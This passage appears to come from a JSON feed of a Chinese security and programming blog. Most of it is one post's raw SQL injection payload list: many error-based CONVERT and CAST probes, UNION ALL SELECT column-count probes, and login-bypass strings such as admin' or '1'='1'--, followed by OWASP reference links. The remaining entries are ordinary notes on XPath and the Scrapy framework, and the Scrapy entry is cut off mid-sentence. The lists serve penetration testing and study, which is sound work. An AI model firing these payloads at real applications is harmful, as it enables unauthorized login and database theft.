AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#\n UNION ALL SELECT NULL \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\n AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\n AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)\n AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\n UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX'\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX'#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n</code></pre>\n<h2 id=\"sql-injection-auth-bypass-payloads\"><a class=\"anchor\" href=\"#sql-injection-auth-bypass-payloads\">#</a> SQL Injection Auth Bypass Payloads</h2>\n<pre><code>'-'\n' '\n'&amp;'\n'^'\n'*'\n' or ''-'\n' or '' '\n' or ''&amp;'\n' or ''^'\n' or ''*'\n&quot;-&quot;\n&quot; &quot;\n&quot;&amp;&quot;\n&quot;^&quot;\n&quot;*&quot;\n&quot; or &quot;&quot;-&quot;\n&quot; or &quot;&quot; &quot;\n&quot; or &quot;&quot;&amp;&quot;\n&quot; or &quot;&quot;^&quot;\n&quot; or &quot;&quot;*&quot;\nor true--\n&quot; or true--\n' or true--\n&quot;) or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n&quot; or &quot;x&quot;=&quot;x\n&quot;) or (&quot;x&quot;)=(&quot;x\n&quot;)) or ((&quot;x&quot;))=((&quot;x\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' #\nadmin'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin' or 1=1#\nadmin' or 1=1/*\nadmin') or ('1'='1\nadmin') or ('1'='1'--\nadmin') or ('1'='1'#\nadmin') or ('1'='1'/*\nadmin') or '1'='1\nadmin') or '1'='1'--\nadmin') or '1'='1'#\nadmin') or '1'='1'/*\n1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\nadmin&quot; --\nadmin&quot; #\nadmin&quot;/*\nadmin&quot; or &quot;1&quot;=&quot;1\nadmin&quot; or &quot;1&quot;=&quot;1&quot;--\nadmin&quot; or &quot;1&quot;=&quot;1&quot;#\nadmin&quot; or &quot;1&quot;=&quot;1&quot;/*\nadmin&quot;or 1=1 or &quot;&quot;=&quot;\nadmin&quot; or 1=1\nadmin&quot; or 1=1--\nadmin&quot; or 1=1#\nadmin&quot; or 1=1/*\nadmin&quot;) or (&quot;1&quot;=&quot;1\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;--\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;#\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;/*\nadmin&quot;) or &quot;1&quot;=&quot;1\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;--\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;#\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;/*\n1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055\n</code></pre>\n<h2 id=\"references\"><a class=\"anchor\" href=\"#references\">#</a> References :</h2>\n<ul>\n<li>SQL Injection ( OWASP )</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9u\">https://www.owasp.org/index.php/SQL_Injection</span></p>\n<ul>\n<li>Blind SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9CbGluZF9TUUxfSW5qZWN0aW9u\">https://www.owasp.org/index.php/Blind_SQL_Injection</span></p>\n<ul>\n<li>Testing for SQL Injection (OTG-INPVAL-005)</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9TUUxfSW5qZWN0aW9uXyhPVEctSU5QVkFMLTAwNSk=\">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)</span></p>\n<ul>\n<li>SQL Injection Bypassing WAF</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9uX0J5cGFzc2luZ19XQUY=\">https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF</span></p>\n<ul>\n<li>Reviewing Code for SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9SZXZpZXdpbmdfQ29kZV9mb3JfU1FMX0luamVjdGlvbg==\">https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection</span></p>\n<ul>\n<li>PL/SQL:SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QTC9TUUw6U1FMX0luamVjdGlvbg==\">https://www.owasp.org/index.php/PL/SQL:SQL_Injection</span></p>\n<ul>\n<li>Testing for NoSQL injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9Ob1NRTF9pbmplY3Rpb24=\">https://www.owasp.org/index.php/Testing_for_NoSQL_injection</span></p>\n<ul>\n<li>SQL Injection Injection Prevention Cheat Sheet</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9JbmplY3Rpb25fUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1s\">https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html</span></p>\n<ul>\n<li>SQL Injection Query Parameterization Cheat Sheet</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9RdWVyeV9QYXJhbWV0ZXJpemF0aW9uX0NoZWF0X1NoZWV0Lmh0bWw=\">https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html</span></p>\n",
            "tags": [
                "web安全",
                "sql注入",
                "payload"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2020/12/28/Learning-from-xpath/",
            "url": "https://self-ferry.github.io/2020/12/28/Learning-from-xpath/",
            "title": "Learning from xpath",
            "date_published": "2020-12-28T09:50:52.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>以前学过，用到的时候才发现忘的差不多了。总结一下吧。</p>\n<h1 id=\"认识xpath\"><a class=\"anchor\" href=\"#认识xpath\">#</a> 认识 XPath</h1>\n<h2 id=\"什么是xpath\"><a class=\"anchor\" href=\"#什么是xpath\">#</a> 什么是 XPath</h2>\n<ol>\n<li>解析 XML 的一种语言（HTML 其实是 XML 的子集），广泛用于解析 HTML 数据</li>\n<li>几乎所有语言都能使用 XPath<br />\n<img data-src=\"image001.png\" alt=\"\" /></li>\n<li>除了 XPath 还有其他手段用于 XML 解析，比如：BeautifulSoup、lxml、DOM、SAX、JSDOM、DOM4J、minixml 等。</li>\n</ol>\n<h2 id=\"xpath语法\"><a class=\"anchor\" href=\"#xpath语法\">#</a> XPath 语法</h2>\n<p>XPath 语法其实只有 3 大分类：</p>\n<ul>\n<li>层级：/ 直接子级、 // 跳级</li>\n<li>属性：@ 属性访问</li>\n<li>函数： contains ()、 text ()、extract () 等</li>\n</ul>\n<p>了解一些常用的就够了，其他的需要时可以百度</p>\n<h1 id=\"使用xpath\"><a class=\"anchor\" href=\"#使用xpath\">#</a> 使用 XPath</h1>\n<ol>\n<li>\n<p>在浏览器中使用 Xpath</p>\n</li>\n<li>\n<p>在 scrapy 中使用 XPath</p>\n</li>\n</ol>\n<h1 id=\"额外了解到的知识\"><a class=\"anchor\" href=\"#额外了解到的知识\">#</a> 额外了解到的知识</h1>\n<p>json 是一种数据格式<br />\n jsonp 是一种数据调用的方式。</p>\n<p>你可以简单的理解为 带 callback 的 json 就是 jsonp.</p>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p>B 站的视频，看了就会了，挺不错的。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW1XNDExRDd3Qz9mcm9tPXNlYXJjaCZhbXA7c2VpZD0xMzUxNTc2MzI0NTU4NDA2MDQx\">https://www.bilibili.com/video/BV1mW411D7wC?from=search&amp;seid=1351576324558406041</span></p>\n",
            "tags": [
                "web",
                "xpath"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2020/12/28/scrapy%E6%A1%86%E6%9E%B6/",
            "url": "https://self-ferry.github.io/2020/12/28/scrapy%E6%A1%86%E6%9E%B6/",
            "title": "scrapy框架",
            "date_published": "2020-12-28T09:47:19.000Z",
            "content_html": "<h1 id=\"什么是scrapy\"><a class=\"anchor\" href=\"#什么是scrapy\">#</a> 什么是 scrapy</h1>\n<font color=\"#00CED1\">\n<p>Scrapy 是一个为了爬取网站数据，提取结构性数据而编写的应用框架。可以应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。其最初是为了页面抓取 (更确切来说，网络抓取) 所设计的，也可以应用在获取 API 所返回的数据 (例如 Amazon Associates Web Services ) 或者通用的网络爬虫。Scrapy 其实是 Search+Python。Scrapy 使用 Twisted 这个异步网络库来处理网络通讯，架构清晰，并且包含了各种中间件接口，可以灵活的完成各种需求。</p>\n</font>\n<h1 id=\"scrapy架构\"><a class=\"anchor\" href=\"#scrapy架构\">#</a> scrapy 架构</h1>\n<h2 id=\"scrapy整体结构\"><a class=\"anchor\" href=\"#scrapy整体结构\">#</a> Scrapy 整体结构</h2>\n<font color=\"#00CED1\">\n<p><strong>1、引擎 (Scrapy Engine)</strong><br />\n 用来处理整个系统的数据流处理，触发事务。</p>\n<p><strong>2、调度器 (Scheduler)</strong><br />\n 用来接受引擎发过来的请求，压入队列中，并在引擎再次请求的时候返回。</p>\n<p><strong>3、下载器 (Downloader)</strong><br />\n 用于下载网页内容，并将网页内容返回给蜘蛛。</p>\n<p><strong>4、蜘蛛 (Spiders)</strong><br />\n 蜘蛛是主要干活的，用它来制订特定域名或网页的解析规则。编写用于分析 response 并提取 item (即获取到的 item) 或额外跟进的 URL 的类。<br />\n每个 spider 负责处理一个特定 (或一些) 网站。蜘蛛的整个抓取流程（周期）是这样的：</p>\n<ol>\n<li>首先获取第一个 URL 的初始请求，当请求返回后调取一个回调函数。第一个请求是通过调用 start_requests () 方法。该方法默认从 start_urls 中的 Url 中生成请求，并执行解析来调用回调函数。</li>\n<li>在回调函数中，你可以解析网页响应并返回项目对象和请求对象或两者的迭代。这些请求也将包含一个回调，然后被 Scrapy 下载，然后有指定的回调处理。</li>\n<li>在回调函数中，你解析网站的内容，同程使用的是 Xpath 选择器（但是你也可以使用 BeautifuSoup, lxml 或其他任何你喜欢的程序），并生成解析的数据项。</li>\n<li>最后，从蜘蛛返回的项目通常会进驻到项目管道。</li>\n</ol>\n<p><strong>5、项目管道 (Item Pipeline)</strong><br />\n 主要责任是负责处理有蜘蛛从网页中抽取的项目，他的主要任务是清晰、验证和存储数据。当页面被蜘蛛解析后，将被发送到项目管道，并经过几个特定的次序处理数据。每个项目管道的组件都是有一个简单的方法组成的 Python 类。他们获取了项目并执行他们的方法，同时他们还需要确定的是是否需要在项目管道中继续执行下一步或是直接丢弃掉不处理。<br />\n项目管道通常执行的过程有：</p>\n<ol>\n<li>清洗 HTML 数据</li>\n<li>验证解析到的数据（检查项目是否包含必要的字段）</li>\n<li>检查是否是重复数据（如果重复就删除）</li>\n<li>将解析到的数据存储到数据库中</li>\n</ol>\n<p><strong>6、下载器中间件 (Downloader Middlewares)</strong><br />\n 位于 Scrapy 引擎和下载器之间的钩子框架，主要是处理 Scrapy 引擎与下载器之间的请求及响应。它提供了一个自定义的代码的方式来拓展 Scrapy 的功能。下载中间器是一个处理请求和响应的钩子框架。他是轻量级的，对 Scrapy 尽享全局控制的底层的系统。</p>\n<p><strong>7、蜘蛛中间件 (Spider Middlewares)</strong><br />\n 介于 Scrapy 引擎和蜘蛛之间的钩子框架，主要工作是处理蜘蛛的响应输入和请求输出。它提供一个自定义代码的方式来拓展 Scrapy 的功能。蛛中间件是一个挂接到 Scrapy 的蜘蛛处理机制的框架，你可以插入自定义的代码来处理发送给蜘蛛的请求和返回蜘蛛获取的响应内容和项目。</p>\n<p><strong>8、调度中间件 (Scheduler Middlewares)</strong><br />\n 介于 Scrapy 引擎和调度之间的中间件，从 Scrapy 引擎发送到调度的请求和响应。他提供了一个自定义的代码来拓展 Scrapy 的功能。</p>\n<p><strong>数据处理流程</strong><br />\n<img data-src=\"image001.jpg\" alt=\"\" /></p>\n<p>如图所示，显示的是 Scrapy 爬虫执行流程，绿线是数据流向，首先从初始 URL 开始，Scheduler 